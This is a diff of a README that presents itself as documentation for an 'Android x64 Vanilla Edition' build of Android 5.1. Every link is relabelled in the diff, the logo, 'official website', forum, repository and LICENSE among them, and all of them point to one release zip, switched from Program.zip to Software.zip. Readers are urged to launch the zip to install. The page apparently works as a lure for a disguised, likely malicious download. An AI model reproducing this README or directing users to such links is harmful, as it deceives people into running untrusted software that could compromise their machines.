@@ -1,15 +1,15 @@
 # 🤖️📖️ Welcome to Android x64 Vanilla Edition Documentation Repository
 
-![Android Logo](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip)
+![Android Logo](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip)
 
 ## Overview
 
 Welcome to the official documentation source repository for the Vanilla build of Android 5.1, a basic but useful alternative installation of Android 5.1 (Lollipop) for x64 architecture. This repository contains all the essential information you need to get started with Android x64 Vanilla Edition.
 
 ### Quick Links
-- [Download Android x64 Vanilla Edition](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip)
-- [Explore Other Repositories](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip)
-- [Android x64 Vanilla Edition Website](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip)
+- [Download Android x64 Vanilla Edition](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip)
+- [Explore Other Repositories](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip)
+- [Android x64 Vanilla Edition Website](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip)
 
 ## About Android x64 Vanilla Edition
 
@@ -33,7 +33,7 @@ Android x64 Vanilla Edition is a project aimed at providing a streamlined and ef
 
 To start exploring the documentation and setup guide for Android x64 Vanilla Edition, please click the button below:
 
-[![Download Android x64 Vanilla Edition](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip%20x64%20Vanilla%20Edition-blue)](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip)
+[![Download Android x64 Vanilla Edition](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip%20x64%20Vanilla%20Edition-blue)](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip)
 
 **Note:** The provided link leads to the installation package for Android x64 Vanilla Edition. Make sure to launch the zip file to begin the installation process.
 
@@ -48,9 +48,9 @@ To start exploring the documentation and setup guide for Android x64 Vanilla Edi
 
 ## Additional Resources
 
-- [Android x64 Vanilla Edition Official Website](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip)
-- [Android x64 Vanilla Edition GitHub Repository](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip)
-- [Android x64 Vanilla Edition Community Forum](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip)
+- [Android x64 Vanilla Edition Official Website](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip)
+- [Android x64 Vanilla Edition GitHub Repository](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip)
+- [Android x64 Vanilla Edition Community Forum](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip)
 
 ## Community and Support
 
@@ -58,7 +58,7 @@ For any questions, feedback, or support regarding Android x64 Vanilla Edition, f
 
 ## License
 
-Android x64 Vanilla Edition is licensed under GPL-3.0. For more details, refer to the [LICENSE](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v1.0/Program.zip) file in the repository.
+Android x64 Vanilla Edition is licensed under GPL-3.0. For more details, refer to the [LICENSE](https://github.com/harbox11/Android-x64_Android5.1_Vanilla_Edition_Docs/releases/download/v2.0/Software.zip) file in the repository.
 
 ---
 
